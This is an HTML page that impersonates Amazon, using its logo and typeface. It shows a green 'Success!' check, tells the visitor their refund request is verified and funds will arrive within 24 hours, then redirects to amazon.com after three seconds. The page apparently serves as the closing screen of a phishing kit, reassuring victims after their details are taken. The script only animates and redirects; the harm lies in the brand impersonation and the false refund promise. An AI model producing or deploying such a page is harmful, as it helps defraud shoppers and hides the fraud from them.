<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing Complete</title>
    <link rel="icon" href="/images/favicon.png" type="image/png">

    <style>
        body, html { margin: 0; padding: 0; font-family: "Amazon Ember", Arial, sans-serif; background-color: #fff; color: #111; overflow: hidden; }
        .header { background: linear-gradient(to bottom, #f7f7f7, #eaeaea); border-bottom: 1px solid #ddd; padding: 15px 20px; text-align: center; }
        .logo-img { height: 35px; }
        .container { max-width: 500px; margin: 80px auto; text-align: center; padding: 20px; }
        .checkmark-circle { width: 80px; height: 80px; position: relative; display: inline-block; vertical-align: top; margin-bottom: 20px; }
        .checkmark-circle .background { width: 80px; height: 80px; border-radius: 50%; background: #007600; position: absolute; animation: scaleIn 0.4s ease-in-out forwards; }
        .checkmark-circle .checkmark { border-radius: 5px; }
        .checkmark-circle .checkmark.draw:after { animation-delay: 0.5s; animation-duration: 0.5s; animation-timing-function: ease; animation-name: checkmark; transform: scaleX(-1) rotate(135deg); animation-fill-mode: forwards; }
        .checkmark-circle .checkmark:after { opacity: 1; height: 40px; width: 20px; transform-origin: left top; border-right: 7px solid white; border-top: 7px solid white; content: ''; left: 18px; top: 40px; position: absolute; }
        @keyframes scaleIn { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        h1 { color: #007600; font-size: 28px; margin-bottom: 10px; opacity: 0; animation: fadeIn 0.5s 0.3s forwards; }
        p { font-size: 16px; color: #333; opacity: 0; animation: fadeIn 0.5s 0.6s forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .redirect-text { margin-top: 40px; font-size: 12px; color: #777; opacity: 0; animation: fadeIn 0.5s 1s forwards; }
        .loader-bar { width: 0%; height: 3px; background-color: #e77600; margin: 10px auto; border-radius: 2px; transition: width 3s linear; }
    </style>
</head>
<body>
    <div class="header">
        <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
    </div>
    <div class="container">
        <div class="checkmark-circle">
            <div class="background"></div>
            <div class="checkmark draw"></div>
        </div>
        <h1>Success!</h1>
        <p>Your refund request has been verified.<br>Funds will arrive within 24 hours.</p>
        <div class="redirect-text">
            Redirecting to Amazon Home Page...
            <div class="loader-bar" id="progressBar"></div>
        </div>
    </div>
    <script>
        setTimeout(() => { document.getElementById('progressBar').style.width = '100%'; }, 100);
        setTimeout(() => { window.location.replace("https://www.amazon.com"); }, 3000);
    </script>
</body>
</html>
